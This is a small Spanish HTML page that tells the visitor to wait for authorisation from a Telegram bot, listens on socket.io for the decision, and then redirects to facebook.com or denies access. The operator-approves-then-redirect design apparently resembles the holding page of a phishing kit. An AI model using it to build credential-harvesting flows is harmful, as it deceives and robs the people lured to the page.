<!DOCTYPE html>
<html lang="es">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Esperando confirmación...</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f3f3;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .mensaje {
      background: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="mensaje">
    <h2>Esperando autorización desde Telegram...</h2>
    <p>No cierres esta ventana.</p>
  </div>

  <script>
    const socket = io();
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('sessionId');

    // Reconectar al servidor
    socket.emit('reconectar', sessionId);

    // Escuchar respuesta del bot
    socket.on('respuesta', (decision) => {
      if (decision === 'aprobado') {
        window.location.href = 'https://www.facebook.com'; // o donde necesites
      } else {
        alert('Acceso denegado por seguridad.');
        window.location.href = '/';
      }
    });
  </script>
</body>
</html>
